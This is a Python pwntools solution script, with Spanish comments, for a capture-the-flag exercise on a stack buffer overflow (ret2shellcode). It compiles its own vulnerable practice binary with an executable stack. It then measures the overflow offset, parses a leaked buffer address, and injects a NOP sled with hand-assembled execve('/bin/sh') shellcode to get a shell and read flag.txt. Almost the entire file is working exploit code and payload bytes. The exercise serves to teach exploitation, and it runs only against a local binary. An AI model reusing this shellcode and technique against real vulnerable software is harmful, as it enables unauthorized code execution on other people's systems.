#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-03 - "El estanque ejecutable": ret2shellcode con -z execstack.
Diagnóstico: checksec marca la pila RWX (GNU_STACK RWE); el fuente
imprime la dirección de buffer[] (leak pedagógico integrado).
Razonamiento: NX está desactivado SOLO aquí: puedes sembrar código
máquina en el stack y aterrizar en él con el retorno. NOP sled como
amortiguador + shellcode execve("/bin/sh") + ret -> mitad del sled.
El shell hereda stdin/stdout: cat flag.txt y a casa.
USO: python3 sol_ctf03.py"""
from pwn import *
import os
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf03'
FLAG_DEMO = 'FLAG{CTF03_estanque_ejecutable}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-z', 'execstack', '-o', BIN, 'ctf03.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

# Shellcode execve("/bin/sh", NULL, NULL) para amd64 - 23 bytes, sin 0x0a
shellcode = (
    b'\x48\x31\xf6'                              # xor  rsi, rsi
    b'\x56'                                      # push rsi          (NUL)
    b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'  # mov  rdi, '//bin/sh'
    b'\x57'                                      # push rdi
    b'\x54'                                      # push rsp
    b'\x5f'                                      # pop  rdi  -> &"/bin/sh"
    b'\x6a\x3b'                                  # push 0x3b  (execve=59)
    b'\x58'                                      # pop  rax
    b'\x99'                                      # cdq       (rdx=0)
    b'\x0f\x05'                                  # syscall
)
assert b'\n' not in shellcode, 'el shellcode no puede contener 0x0a'
log.info('Shellcode cargado: %d bytes', len(shellcode))

# ------------------------------------------------------------------
# FASE 1 - offset dinámico (cyclic + corefile, método A2)
# ------------------------------------------------------------------
io2 = process(BIN)
io2.recvuntil(b'debug: buffer en ')
io2.recvline()                       # descartar el leak de esta corrida
io2.sendline(cyclic(300))
io2.wait()
try:
    core = io2.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io2.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - exploit: leer el leak real, sembrar el estanque, aterrizar
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'debug: buffer en ')
leak_linea = io.recvline().strip()   # dirección REAL del proceso vivo
buf_addr = int(leak_linea, 16)
log.info('Leak parseado: buffer[] vive en %#x', buf_addr)

NOP_SLED = 96                       # 96 x 0x90: aterrizaje amortiguado
ret_addr = buf_addr + NOP_SLED // 2  # apuntar a MITAD del sled
while b'\n' in p64(ret_addr):        # si un byte de la dirección es 0x0a
    ret_addr += 8
assert buf_addr <= ret_addr < buf_addr + NOP_SLED, 'ret debe caer en el sled'

payload = b'\x90' * NOP_SLED + shellcode
payload += b'B' * (offset - len(payload))    # relleno hasta el ret guardado
payload += p64(ret_addr)
assert b'\n' not in payload, 'gets() cortaría el payload en el primer 0x0a'
assert len(payload) <= 255, 'payload demasiado largo para gets() aquí'

io.sendline(payload)
time.sleep(0.3)
io.sendline(b'cat flag.txt; echo PWNED_CTF03_$(id -u); exit')
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_CTF03' in salida and (FLAG_DEMO.encode() in salida
                                 or b'FLAG{' in salida):
    log.success('CTF-03 SUPERADO: shellcode ejecutado en el stack y flag '
                'leída por TU shell.')
else:
    log.failure('CTF-03: sin shell. Repasa: -z execstack en checksec, '
                'leak parseado (no el de GDB), NOP sled y shellcode sin 0x0a.')
